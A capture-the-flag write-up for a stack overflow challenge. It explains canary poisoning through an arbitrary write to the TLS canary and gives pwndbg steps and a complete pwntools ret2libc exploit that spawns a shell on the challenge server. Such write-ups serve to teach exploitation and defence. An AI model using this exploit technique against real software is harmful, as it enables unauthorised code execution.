# Stack BOF Writeup
**Category:** Binary Exploitation  
**Author:** keymoon  

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Files Provided](#files-provided)
3. [Phase -1: Environment Setup](#phase--1-environment-setup)
4. [Phase 0: Recon](#phase-0-recon)
5. [Key Concepts](#key-concepts)
   - [What is a Stack Canary?](#what-is-a-stack-canary)
   - [What are Segment Registers?](#what-are-segment-registers)
   - [What is fs:0x28?](#what-is-fs0x28)
   - [Two Copies of the Canary](#two-copies-of-the-canary)
   - [What is TLS?](#what-is-tls)
   - [What is pthread_self()?](#what-is-pthread_self)
6. [Phase 1: Static Analysis](#phase-1-static-analysis)
   - [Source Code Breakdown](#source-code-breakdown)
   - [Stack Frame Layout](#stack-frame-layout)
   - [Primitives Identified](#primitives-identified)
   - [Protections and Implications](#protections-and-implications)
7. [Phase 2: Vulnerability Analysis](#phase-2-vulnerability-analysis)
   - [Why Normal Overflow Fails](#why-normal-overflow-fails)
   - [The Key Insight — Canary Poisoning](#the-key-insight--canary-poisoning)
8. [Phase 3: Dynamic Analysis (pwndbg)](#phase-3-dynamic-analysis-pwndbg)
   - [Commands Run and Why](#commands-run-and-why)
   - [The Offset Problem — Local vs Remote](#the-offset-problem--local-vs-remote)
9. [Phase 4: Exploit Strategy](#phase-4-exploit-strategy)
   - [Offset Calculation Explained](#offset-calculation-explained)
   - [ROP Chain Explained](#rop-chain-explained)
   - [Stack Alignment Explained](#stack-alignment-explained)
10. [Phase 5: Final Exploit](#phase-5-final-exploit)
11. [Flag](#flag)
12. [Lessons Learned](#lessons-learned)
13. [Concept Glossary](#concept-glossary)

---

## Challenge Overview

We're given a small C binary with **all protections enabled** (PIE, NX, Full RELRO, Stack Canary). The program:

1. **Leaks** `printf`'s runtime address (giving us libc location)
2. Lets us **write 8 bytes to any address** we choose (arbitrary write primitive)
3. Calls `gets(buf)` which has an **unbounded stack overflow**

The challenge is: the stack overflow is blocked by the canary. The arbitrary write happens *before* `gets()`. The technique is to use the write to poison the canary's master copy, then overflow freely.

---

## Files Provided

```
Dockerfile              — defines the remote container (Ubuntu 24.04)
compose.yml             — Docker compose config
main.c                  — source code
stack-bof               — compiled binary
```

---

## Phase -1: Environment Setup

### Why This Phase Exists

"Wrong libc = wasted day." The binary must run against the *exact* libc it was compiled for. If you measure offsets from your system libc, they won't match the binary's libc.

### Steps

```bash
# 1. List files
ls -la

# 2. Check libc version
strings libc.so.6 | grep "GNU C Library"
# Output: GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.7) stable release version 2.39.

# 3. Patch binary to use provided libc (pwninit does this automatically)
pwninit --bin ./stack-bof --libc ./libc.so.6 --ld ./ld-linux-x86-64.so.2
# Creates: stack-bof_patched + solve.py stub

# 4. Verify patch worked
ldd ./stack-bof_patched
# Should show ./libc.so.6 (local path, not /lib/x86_64-linux-gnu/libc.so.6)
```

**What pwninit does:** Patches the binary's interpreter (RPATH) so it loads your provided `libc.so.6` and `ld-linux-x86-64.so.2` instead of the system ones. This ensures all offsets you measure locally match what the binary actually uses.

**What pwninit does NOT do:** Control where the kernel places TLS in memory. That depends on the kernel, container environment, and ASLR state. This becomes important later.

---

## Phase 0: Recon

### Checksec Output

```bash
checksec --file=./stack-bof
```

```
RELRO:    Full RELRO      — GOT is read-only, no GOT overwrites
CANARY:   Canary found    — stack overflow protection enabled
NX:       NX enabled      — no shellcode on stack
PIE:      PIE enabled     — binary loads at random address each run
```

### Quick Win Checks

```bash
# Any win/flag functions?
objdump -t stack-bof | grep -iE "win|flag|shell|secret"
# Nothing.

# system@plt or execve?
objdump -d stack-bof | grep -E "system|execve"
# Nothing directly — must use libc.

# /bin/sh string in binary?
strings stack-bof | grep "/bin/sh"
# Not in binary — must use libc's copy.

# ROP gadgets?
ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
# 0x000000000010f78b : pop rdi ; ret   ← found in libc
```

### Get Offsets from Provided libc

```bash
# printf offset
nm -D libc.so.6 | grep " printf$"
# 2611: 0000000000060100  printf
# PRINTF_OFF = 0x60100

# system offset
readelf -s libc.so.6 | grep " system@@"
# 1050: 0000000000058750  system
# SYSTEM_OFF = 0x58750

# /bin/sh string offset
strings -t x libc.so.6 | grep "/bin/sh"
# 1cb42f /bin/sh
# BINSH_OFF = 0x1cb42f

# ROP gadgets
ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
# POP_RDI_OFF = 0x10f78b

ROPgadget --binary libc.so.6 | grep ": ret$" | head -5
# RET_OFF = 0x2882f
```

---

## Phase 1: Static Analysis

### Source Code Breakdown

```c
int main() {
  char buf[8];           // 8-byte buffer on stack
  uint64_t* dest = 0;    // pointer, initially NULL

  printf("printf: %p\n", printf);   // [1] LEAK: prints printf's address

  read(0, &dest, 8);    // [2] WRITE-WHERE: you send 8 bytes → stored in dest
  read(0, dest, 8);     // [3] WRITE-WHAT:  you send 8 bytes → written to *dest

  gets(buf);            // [4] OVERFLOW: no bounds check, reads until newline
}
```

**Line [1]:** `printf` is a function in libc. Its address at runtime = `libc_base + 0x60100`. Leaking it tells you exactly where libc is loaded.

**Lines [2]+[3]:** Together these form an **arbitrary write** — you control both *what* to write and *where* to write it. This executes BEFORE the overflow.

**Line [4]:** `gets()` is famously unsafe — it reads until `\n` with no length limit. You can overwrite anything above `buf` on the stack.

### Stack Frame Layout

From disassembly:
```
main+8:   sub rsp, 0x20         ; allocate 32 bytes
main+12:  mov rax, fs:[0x28]    ; read master canary from TLS
main+21:  mov [rbp-0x8], rax    ; save copy on stack
main+27:  mov [rbp-0x18], 0x0   ; initialize dest = NULL
```

Memory layout (low to high):

```
ADDRESS         CONTENT              OFFSET FROM RBP
─────────────────────────────────────────────────────
rbp - 0x18    [ dest pointer    ]   ← read #1 fills this
rbp - 0x10    [ buf[8]          ]   ← gets() starts here
rbp - 0x08    [ canary copy     ]   ← must match fs:[0x28]
rbp + 0x00    [ saved RBP       ]
rbp + 0x08    [ return address  ]   ← RIP control here
```

So `gets()` writing from `rbp-0x10`:
- Bytes 0–7:   fills `buf`
- Bytes 8–15:  **overwrites canary copy** at `rbp-0x8`
- Bytes 16–23: overwrites saved RBP
- Bytes 24+:   overwrites return address → RIP control

### Primitives Identified

| # | Primitive | What You Get |
|---|-----------|-------------|
| 1 | printf leak | `libc_base = leaked_printf - 0x60100` |
| 2 | Arbitrary 8-byte write (once) | Write any 8 bytes to any writable address |
| 3 | `gets()` stack BOF | Unlimited write from `buf` upward |

### Protections and Implications

| Protection | What It Blocks | Our Bypass |
|-----------|---------------|------------|
| PIE | Can't use hardcoded binary addresses | Only need libc addresses (we have leak) |
| Full RELRO | GOT is read-only, no GOT overwrite | Don't need GOT — use libc directly |
| NX | No shellcode execution | Use ROP chain instead |
| Canary | Stack overflow detected → crash | **Canary poisoning via arbitrary write** |

---

## Phase 2: Vulnerability Analysis

### Why Normal Overflow Fails

When `main()` starts:
```asm
mov rax, fs:[0x28]      ; read MASTER canary (random, set at startup)
mov [rbp-0x8], rax      ; save COPY on stack
```

When `main()` ends:
```asm
mov rdx, [rbp-0x8]              ; load stack copy
sub rdx, qword ptr fs:[0x28]    ; subtract master
jne → __stack_chk_fail          ; if different → ABORT
```

If you overflow and corrupt the stack copy, it no longer matches the master at `fs:[0x28]`. Program calls `__stack_chk_fail()` → SIGABRT → dead.

You can't read the master canary (it's in TLS, not printed). You can't guess it (64-bit random). So the overflow is useless... normally.

### The Key Insight — Canary Poisoning

**The arbitrary write runs BEFORE `gets()`.**

What if you overwrite the **master canary at `fs:[0x28]`** with a value YOU choose?

```
Before attack:  fs:[0x28] = 0xa8d3016c4db21f00  (random, unknown)
After write:    fs:[0x28] = 0x6161616161616161  (your chosen value: "aaaaaaaa")
```

Now you KNOW the master canary. Put the same value in the overflow at `rbp-0x8`. The check becomes:

```
stack_copy:  0x6161616161616161  (you put this in overflow)
master:      0x6161616161616161  (you wrote this via arbitrary write)
check:       equal → PASSES → ret executes → RIP CONTROL
```

The canary protection is completely nullified.

---

## Phase 3: Dynamic Analysis (pwndbg)

### Commands Run and Why

#### Step 1: Verify stack layout

```bash
pwndbg ./stack-bof_patched

# Break at start of main
(pwndbg) break main
(pwndbg) run

# See the canary being loaded
(pwndbg) disas main
# Look for: mov rax, QWORD PTR fs:[0x28]
# Look for: mov QWORD PTR [rbp-0x8], rax
# This confirms canary is at rbp-0x8

# See current stack
(pwndbg) x/20gx $rsp
```

#### Step 2: Find TLS canary address

```bash
# pthread_self() returns the TLS base address
# The canary is always at TLS_base + 0x28
(pwndbg) p/x (unsigned long)pthread_self() + 0x28
# Returns something like: 0x7ffff7fba768
# This is WHERE the master canary lives in memory
```

**Why `pthread_self() + 0x28`?**  
`pthread_self()` returns the base of the Thread Local Storage block. At offset `+0x28` within that block lives the `stack_guard` field — the master canary. This is a hardcoded glibc convention.

#### Step 3: Find libc base (for offset calculation)

```bash
(pwndbg) info proc mappings
# Look for the line with your libc.so.6
# The "Start Addr" is libc_base
# Example: 0x00007ffff7c00000  libc.so.6
```

#### Step 4: Calculate TLS offset from libc_base

```bash
# In your head or with Python:
# TLS_canary = 0x7ffff7fba768
# libc_base  = 0x7ffff7c00000
# offset     = 0x7ffff7fba768 - 0x7ffff7c00000 = 0x1ba768
```

#### Step 5: Verify canary check at runtime

```bash
(pwndbg) break *main+145      # break at: sub rdx, QWORD PTR fs:[0x28]
(pwndbg) run
# Send some input, trigger gets(), then at breakpoint:
(pwndbg) p/x $rdx             # this is the stack copy of canary
(pwndbg) x/gx (unsigned long)pthread_self() + 0x28   # this is master
# They should match if no overflow, differ if overflowed
```

**Reading the disasm output at main+145:**
```
sub rdx, qword ptr fs:[0x28]   RDX => 0 (0xe178... - 0xe178...)
je  main+161                   ← jump taken = canary check PASSED
```
The `RDX => 0` tells you the subtraction result is zero = they match = check passes.

### The Offset Problem — Local vs Remote

**This is the most important lesson of this challenge.**

When running locally without ASLR (GDB's default):
```
libc_base  = 0x7ffff7c00000
TLS canary = 0x7ffff7fba768
offset     = +0x1ba768 from libc_base
```

When running remotely (Docker container):
```
printf_addr  = 0x7f6552632100
TLS canary   = 0x7f65525cf768
offset       = -0x62998 from printf_addr
```

**They're completely different!** Why?

1. **GDB disables ASLR by default.** Memory loads at fixed addresses in GDB. But `process()` in pwntools uses real ASLR.

2. **TLS and libc are allocated independently by the kernel.** Even with the same libc, TLS can land at different relative positions depending on the container environment, kernel version, and ld.so version.

3. **`pwninit` patches the binary to use the right libc** but cannot control where the kernel allocates TLS.

**The correct procedure:**
```bash
# Spin up the exact Docker container
docker compose up -d
docker exec -it <container_name> /bin/bash

# Inside container, measure directly:
gdb /app/run
break main
run
info proc mappings          # get libc_base
p/x (unsigned long)pthread_self() + 0x28  # get TLS canary address

# Then compute:
# printf_addr (from binary output) - TLS_canary_addr = your offset
```

The remote offset `0x62998` was taken from a published writeup. In a real scenario you'd measure it yourself in the container.

---

## Phase 4: Exploit Strategy

### Offset Calculation Explained

**"Why is it `printf_leak - 0x62998` and not `libc_base + something`?"**

Pure math. In the remote container's memory layout:

```
printf lives at:  0x7f6552632100   (higher address)
canary lives at:  0x7f65525cf768   (lower address)

Number line:
[canary].........[printf]
0x7f65525cf768   0x7f6552632100
       │←── 0x62998 ───→│

To find canary given printf:
canary = printf - 0x62998
       = 0x7f6552632100 - 0x62998
       = 0x7f65525cf768  ✓
```

Why subtraction? Because canary is at a **lower** address than printf in this layout. The distance between them is `0x62998`.

**Sanity check:** `canary + 0x62998` should give back printf:
```
0x7f65525cf768 + 0x62998 = 0x7f6552632100  ✓
```

**How the offset was measured:**
```python
printf_addr  = 0x7f6552632100   # leaked by binary
canary_addr  = 0x7f65525cf768   # measured in container: pthread_self() + 0x28

offset = printf_addr - canary_addr = 0x62998
```

### ROP Chain Explained

**Goal:** Call `system("/bin/sh")` to get a shell.

**Problem:** NX is enabled — can't execute shellcode on stack. Must use existing executable code.

**Solution:** ROP (Return-Oriented Programming) — chain together small snippets of existing code ("gadgets") ending in `ret` that each do one small thing.

The chain we build:

```
┌─────────────────┐
│  pop rdi ; ret  │  ← gadget 1: takes next value off stack → puts in rdi
├─────────────────┤
│  &"/bin/sh"     │  ← this gets popped into rdi (first argument for system)
├─────────────────┤
│  ret            │  ← gadget 2: just for stack alignment (see below)
├─────────────────┤
│  system()       │  ← system(rdi) = system("/bin/sh") → shell
└─────────────────┘
```

**Why `pop rdi`?**  
In x86-64 Linux calling convention, the first argument to a function goes in `rdi`. `system()` takes one argument: the command string. So we need `rdi = address of "/bin/sh"` before calling `system`.

### Stack Alignment Explained

`system()` internally uses SSE instructions (`movaps`) that require RSP to be **16-byte aligned** (divisible by 16) when called.

After popping `pop rdi` and the `/bin/sh` address, RSP might be misaligned. A bare `ret` instruction moves RSP forward by 8 bytes, fixing the alignment.

**Without the `ret` gadget:** `movaps` in system() throws a SIGSEGV.  
**With the `ret` gadget:** RSP aligns correctly, system() runs fine.

This is a standard requirement for **every ret2libc on x86-64.**

---

## Phase 5: Final Exploit

### Annotated Full Script

```python
from pwn import *

# ── Load files (for checksec output and symbol resolution) ────────
elf  = ELF("./stack-bof_patched")
libc = ELF("./libc.so.6")

LOCAL = False   # True = local process, False = remote

if LOCAL:
    p = process("./stack-bof_patched", aslr=False)
    # aslr=False makes pwntools disable ASLR for the child process
    # same as how GDB behaves — needed if using locally-measured offsets
else:
    p = remote("34.170.146.252", 25337)

# ── Offsets (measured from remote container) ──────────────────────
PRINTF_OFF  = 0x60100   # printf - libc_base
              # from: nm -D libc.so.6 | grep " printf$"

CANARY_OFF  = 0x62998   # printf_addr - canary_addr
              # from: measured inside remote Docker container

BINSH_OFF   = 0x1cb42f  # "/bin/sh" string - libc_base
              # from: strings -t x libc.so.6 | grep /bin/sh

POP_RDI_OFF = 0x10f78b  # pop rdi ; ret gadget - libc_base
              # from: ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"

RET_OFF     = 0x2882f   # ret gadget - libc_base (for alignment)
              # from: ROPgadget --binary libc.so.6 | grep ": ret$"

SYSTEM_OFF  = 0x58750   # system() - libc_base
              # from: readelf -s libc.so.6 | grep " system@@"

WRITABLE_OFF= 0x205200  # writable area in libc for fake RBP
              # any writable address works here (libc rw segment)

FAKE_CANARY = b'a' * 8  # 8 bytes we'll put in both master and stack copy

# ── Phase 1: Receive Leak ─────────────────────────────────────────
# Binary prints: "printf: 0x7f...."
p.recvuntil(b"printf: ")
printf_leak = int(p.recvline().strip(), 16)

# Calculate all addresses from the leak
libc_base   = printf_leak - PRINTF_OFF
canary_addr = printf_leak - CANARY_OFF   # NOTE: subtract, canary is below printf
bin_sh      = libc_base + BINSH_OFF
pop_rdi     = libc_base + POP_RDI_OFF
ret_gadget  = libc_base + RET_OFF
system_addr = libc_base + SYSTEM_OFF
fake_rbp    = libc_base + WRITABLE_OFF

log.success(f"printf_leak = {hex(printf_leak)}")
log.success(f"libc_base   = {hex(libc_base)}")    # must end in 000
log.success(f"canary_addr = {hex(canary_addr)}")
log.success(f"system      = {hex(system_addr)}")

# ── Phase 2: Poison Master Canary ─────────────────────────────────
# read(0, &dest, 8) — send the ADDRESS to write to
# This sets the dest pointer = canary_addr
p.send(p64(canary_addr))

# read(0, dest, 8) — send the VALUE to write there
# This overwrites fs:[0x28] (master canary) with our known value
# After this: master canary = 0x6161616161616161 ("aaaaaaaa")
p.send(FAKE_CANARY)

# ── Phase 3: Stack Overflow + ROP Chain ───────────────────────────
# Stack layout at gets(buf):
#
#   rbp-0x10 │ buf[8]        │ ← gets() writes starting here
#   rbp-0x08 │ canary copy   │ ← must match master (= FAKE_CANARY now)
#   rbp+0x00 │ saved RBP     │ ← needs to be a valid writable address
#   rbp+0x08 │ return addr   │ ← our ROP chain starts here
#
# Canary check at epilogue:
#   rdx = [rbp-0x8] = FAKE_CANARY
#   fs:[0x28]       = FAKE_CANARY  (we poisoned it)
#   rdx - fs:[0x28] = 0  →  je taken  →  CHECK PASSES ✓

payload  = b'a' * 8            # pad buf (8 bytes)
payload += FAKE_CANARY         # canary copy = matches poisoned master
payload += p64(fake_rbp)       # saved RBP = valid writable addr (leave uses it)
payload += p64(pop_rdi)        # ret addr → pop rdi ; ret
payload += p64(bin_sh)         #   rdi = &"/bin/sh"
payload += p64(ret_gadget)     # ret (aligns RSP to 16 bytes)
payload += p64(system_addr)    # system("/bin/sh") → shell

p.sendline(payload)
p.interactive()
```

### Why `fake_rbp` Must Be Writable

The `leave` instruction at the end of `main` executes `mov rsp, rbp; pop rbp`. It tries to dereference the fake RBP value (treating it as a pointer to the caller's RBP). If it points to unmapped or read-only memory, you get a segfault before ever reaching your ROP chain.

Setting it to a known writable location inside libc (`libc_base + 0x205200`) avoids this.

---

## Flag

```
tkbctf{*** stack smashing not detected ***}
```

---

## Lessons Learned

### 1. Always Measure Offsets in the Exact Target Environment

`pwninit` gives you the correct libc symbols and gadgets. It does NOT guarantee the TLS offset will match. TLS allocation depends on:
- Kernel version
- ld.so version  
- Container isolation (Docker, nsjail)
- ASLR state

**Always spin up the exact Docker container and measure there:**
```bash
docker compose up -d
docker exec -it <name> gdb /app/run
# measure pthread_self() + 0x28 and compute offset from printf
```

### 2. GDB Disables ASLR by Default

Any offsets measured in GDB (without `set disable-randomization off`) are measured under ASLR-disabled conditions. The real binary process uses ASLR. Use `process("./binary", aslr=False)` in pwntools if you need to match GDB's behavior.

### 3. The Arbitrary Write Order Matters

The exploit only works because the write (`read+read`) happens **before** `gets()`. If the order were reversed, you couldn't poison the canary before the overflow.

Always map the exact order of operations in a challenge — timing is everything.

### 4. libc_base Must End in `0x000`

If your computed `libc_base` doesn't end in three zeros, your offset is wrong. libc is always page-aligned (4096 = 0x1000 bytes). This is an instant sanity check.

### 5. Every Leak Has a Purpose

The printf leak wasn't just for getting libc_base. It was also the anchor point for computing the TLS canary address (`printf - 0x62998`). Never ignore a leak — it always points to an attack vector.

---

## Concept Glossary

### Stack Canary
A random 8-byte value placed on the stack at function entry, checked at function exit. If anything between the buffer and the canary was overwritten (by overflow), the check fails and the program aborts. The "master" copy lives in TLS at `fs:[0x28]`.

### Segment Registers
Special CPU registers (`cs`, `ds`, `ss`, `es`, `fs`, `gs`). In 64-bit Linux, `fs` is repurposed to point to Thread Local Storage. Accessing `fs:[offset]` reads memory at `TLS_base + offset` in a single CPU instruction.

### Thread Local Storage (TLS)
A per-thread private memory block. Each thread has its own. The `fs` register points to the current thread's TLS. At offset `+0x28` lives the master canary (`stack_guard` field in glibc's `tcbhead_t` struct).

### `pthread_self()`
A libc function that returns the base address of the current thread's TLS block — the same value `fs` points to. `pthread_self() + 0x28` = address of master canary.

### Arbitrary Write (Write-What-Where)
The ability to write any value to any address. This challenge gives you one: `read(0, &dest, 8)` sets dest, then `read(0, dest, 8)` writes to it. One shot.

### ROP (Return-Oriented Programming)
Technique to bypass NX (no-execute stack) by chaining existing code snippets ("gadgets") that end in `ret`. Instead of injecting shellcode, you reuse existing executable instructions.

### PIE (Position Independent Executable)
The binary loads at a random base address each run. All binary addresses are relative to that base. With a libc leak, you don't need the binary base — libc has everything you need (system, /bin/sh, gadgets).

### RELRO (Relocation Read-Only)
Full RELRO makes the GOT (Global Offset Table) read-only after startup. Normally you'd overwrite GOT entries to redirect function calls. Full RELRO prevents this.

### ret2libc
Classic exploit technique: use ROP to call `system("/bin/sh")` from libc. Requires a libc leak (to find system's address) and a way to control RIP (return address).

### Stack Alignment (the `ret` gadget)
x86-64 ABI requires RSP to be 16-byte aligned when calling a function. `system()` uses `movaps` internally which faults if misaligned. Adding a bare `ret` gadget adjusts RSP by 8 bytes to fix alignment. Required in virtually every ret2libc on x86-64.

### ASLR (Address Space Layout Randomization)
Kernel feature that randomizes where libraries, stack, and heap are loaded. Controlled by `/proc/sys/kernel/randomize_va_space` (0=off, 2=full). Docker containers often run with ASLR off, making offsets stable across connections.
